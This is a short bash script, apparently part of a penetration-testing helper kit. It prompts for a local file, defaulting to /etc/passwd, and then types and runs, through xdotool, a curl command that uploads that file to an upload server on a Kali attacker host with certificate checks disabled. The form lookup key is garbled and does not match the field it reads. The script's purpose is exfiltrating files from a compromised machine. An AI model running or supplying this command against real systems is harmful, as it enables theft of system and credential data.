#!/bin/bash

: '
curl: upload file to upload server
'

# Generate GUI form items (label, type (optional: default text), name, default (optional))
LOCAL_FILE_LOCATION_FIELD=$(form_item "local file location" "local_file" "/etc/passwd")

# Generate GUI form
generate_form "${LOCAL_FILE_LOCATION_FIELD}" 

LOCAL_FILE_LOCATION=${form_data["upload_flocal_fileile_location"]}

paste_command "curl -X POST https://${KALI_IP}/upload -F 'files=@${LOCAL_FILE_LOCATION}' --insecure"
xdotool key Return
